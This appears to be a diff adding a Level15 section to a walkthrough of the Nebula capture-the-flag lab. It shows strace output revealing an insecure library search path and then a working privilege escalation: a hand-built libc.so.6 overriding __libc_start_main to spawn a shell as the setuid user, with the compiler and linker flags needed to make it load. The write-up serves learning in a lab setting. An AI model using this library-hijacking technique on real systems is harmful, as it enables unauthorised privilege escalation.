@@ -231,3 +231,96 @@ s = "857:g67?5ABBo:BtDA?tIvLDKL{MQPSRQWW."
 for i in range(len(s)):
     print(chr(ord(s[i]) - i), end="")
 ```
+
+## Level15
+
+Following the hint, I ran `strace /home/flag15/flag15`, and the following results popped up:
+
+```
+level15@nebula:~$ strace /home/flag15/flag15
+execve("/home/flag15/flag15", ["/home/flag15/flag15"], [/* 18 vars */]) = 0
+brk(0)                                  = 0x859a000
+access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
+mmap2(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7799000
+access("/etc/ld.so.preload", R_OK)      = -1 ENOENT (No such file or directory)
+open("/var/tmp/flag15/tls/i686/sse2/cmov/libc.so.6", O_RDONLY) = -1 ENOENT (No such file or directory)
+stat64("/var/tmp/flag15/tls/i686/sse2/cmov", 0xbfa0c344) = -1 ENOENT (No such file or directory)
+open("/var/tmp/flag15/tls/i686/sse2/libc.so.6", O_RDONLY) = -1 ENOENT (No such file or directory)
+stat64("/var/tmp/flag15/tls/i686/sse2", 0xbfa0c344) = -1 ENOENT (No such file or directory)
+open("/var/tmp/flag15/tls/i686/cmov/libc.so.6", O_RDONLY) = -1 ENOENT (No such file or directory)
+stat64("/var/tmp/flag15/tls/i686/cmov", 0xbfa0c344) = -1 ENOENT (No such file or directory)
+open("/var/tmp/flag15/tls/i686/libc.so.6", O_RDONLY) = -1 ENOENT (No such file or directory)
+stat64("/var/tmp/flag15/tls/i686", 0xbfa0c344) = -1 ENOENT (No such file or directory)
+open("/var/tmp/flag15/tls/sse2/cmov/libc.so.6", O_RDONLY) = -1 ENOENT (No such file or directory)
+stat64("/var/tmp/flag15/tls/sse2/cmov", 0xbfa0c344) = -1 ENOENT (No such file or directory)
+open("/var/tmp/flag15/tls/sse2/libc.so.6", O_RDONLY) = -1 ENOENT (No such file or directory)
+stat64("/var/tmp/flag15/tls/sse2", 0xbfa0c344) = -1 ENOENT (No such file or directory)
+open("/var/tmp/flag15/tls/cmov/libc.so.6", O_RDONLY) = -1 ENOENT (No such file or directory)
+stat64("/var/tmp/flag15/tls/cmov", 0xbfa0c344) = -1 ENOENT (No such file or directory)
+open("/var/tmp/flag15/tls/libc.so.6", O_RDONLY) = -1 ENOENT (No such file or directory)
+stat64("/var/tmp/flag15/tls", 0xbfa0c344) = -1 ENOENT (No such file or directory)
+open("/var/tmp/flag15/i686/sse2/cmov/libc.so.6", O_RDONLY) = -1 ENOENT (No such file or directory)
+stat64("/var/tmp/flag15/i686/sse2/cmov", 0xbfa0c344) = -1 ENOENT (No such file or directory)
+open("/var/tmp/flag15/i686/sse2/libc.so.6", O_RDONLY) = -1 ENOENT (No such file or directory)
+stat64("/var/tmp/flag15/i686/sse2", 0xbfa0c344) = -1 ENOENT (No such file or directory)
+open("/var/tmp/flag15/i686/cmov/libc.so.6", O_RDONLY) = -1 ENOENT (No such file or directory)
+stat64("/var/tmp/flag15/i686/cmov", 0xbfa0c344) = -1 ENOENT (No such file or directory)
+open("/var/tmp/flag15/i686/libc.so.6", O_RDONLY) = -1 ENOENT (No such file or directory)
+stat64("/var/tmp/flag15/i686", 0xbfa0c344) = -1 ENOENT (No such file or directory)
+open("/var/tmp/flag15/sse2/cmov/libc.so.6", O_RDONLY) = -1 ENOENT (No such file or directory)
+stat64("/var/tmp/flag15/sse2/cmov", 0xbfa0c344) = -1 ENOENT (No such file or directory)
+open("/var/tmp/flag15/sse2/libc.so.6", O_RDONLY) = -1 ENOENT (No such file or directory)
+stat64("/var/tmp/flag15/sse2", 0xbfa0c344) = -1 ENOENT (No such file or directory)
+open("/var/tmp/flag15/cmov/libc.so.6", O_RDONLY) = -1 ENOENT (No such file or directory)
+stat64("/var/tmp/flag15/cmov", 0xbfa0c344) = -1 ENOENT (No such file or directory)
+open("/var/tmp/flag15/libc.so.6", O_RDONLY) = -1 ENOENT (No such file or directory)
+stat64("/var/tmp/flag15", {st_mode=S_IFDIR|0775, st_size=40, ...}) = 0
+open("/etc/ld.so.cache", O_RDONLY)      = 3
+fstat64(3, {st_mode=S_IFREG|0644, st_size=33815, ...}) = 0
+mmap2(NULL, 33815, PROT_READ, MAP_PRIVATE, 3, 0) = 0xb7790000
+close(3)                                = 0
+access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
+open("/lib/i386-linux-gnu/libc.so.6", O_RDONLY) = 3
+read(3, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0p\222\1\0004\0\0\0"..., 512) = 512
+fstat64(3, {st_mode=S_IFREG|0755, st_size=1544392, ...}) = 0
+mmap2(NULL, 1554968, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0xbf3000
+mmap2(0xd69000, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x176) = 0xd69000
+mmap2(0xd6c000, 10776, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0xd6c000
+close(3)                                = 0
+mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb778f000
+set_thread_area({entry_number:-1 -> 6, base_addr:0xb778f8d0, limit:1048575, seg_32bit:1, contents:0, read_exec_only:0, limit_in_pages:1, seg_not_present:0, useable:1}) = 0
+mprotect(0xd69000, 8192, PROT_READ)     = 0
+mprotect(0x8049000, 4096, PROT_READ)    = 0
+mprotect(0x32f000, 4096, PROT_READ)     = 0
+munmap(0xb7790000, 33815)               = 0
+fstat64(1, {st_mode=S_IFCHR|0620, st_rdev=makedev(136, 0), ...}) = 0
+mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7798000
+write(1, "strace it!\n", 11strace it!
+)            = 11
+exit_group(11)                          = ?
+```
+
+The large group of `open` and `stat64` seems to be attempting to open a "libc.so.6" file; however, it cannot find any. Reading the description, it seems we need to create our own "libc.so.6" and place it in one of the directories. This way, we can control the function, and execute arbitary code. A possilbe libc function to replace is `__libc_start_main`, which is guarenteed to exist in all executables. This is confirmed by `objdump -r /home/flag15/flag15`. Thus, I created the file "/var/tmp/flag15/tmp.c" with the following content:
+
+```c
+int __libc_start_main(int *(main) (int, char * *, char * *), int argc, char * * ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end)){
+    system("/bin/sh");
+}
+```
+
+However, when we compile it using the standard command `gcc -fPIC -shared -o libc.so.6 tmp.c`, we get the error "/home/flag15/flag15: relocation error: /var/tmp/flag15/libc.so.6: symbol __cxa_finalize, version GLIBC_2.0 not defined in file libc.so.6 with link time reference". The main problem appears to be lack of definition for `__cxa_finalize` , which is fixed by adding the following code to "/tmp":
+
+```c
+void __cxa_finalize(void * d){
+    return;
+}
+```
+
+Recompiling and excecuting, we obtain another relocation error, but for `system` this time. This is because `system` is a libc function, which is currently dynamically linked in. To statically link in the system, we modify the compiler command to `gcc -fPIC -shared -static-libgcc -Wl,-Bstatic -o libc.so.6 tmp.c`. `-Wl` specifies arguments for the linker.
+
+This time, the error "Inconsistency detected by ld.so: dl-lookup.c: 169: check_match: Assertion 'version->filename == ((void *)0) || ! _dl_name_match_p (version->filename, map)' failed!" comes up. This is due to the lack of version specification of our library. To fix this, I created another file named "version", and added it to the linker arguments, so the compile command becomes `gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic -o libc.so.6 tmp.c`. The file contains "GLIBC_2.0{};". For more about version, check out [here](http://sourceware.org/binutils/docs-2.18/ld/VERSION.html#VERSION).
+
+Now, compiling and executing the executable spawns a shell. Its priveledges are checked by `whoami`. After realising the user is indeed "flag15", we can execute `getflag` successfully.
+
+Don't forget to clean up by `rm /var/tmp/flag15/*` to revert the machine to the previous state.
+
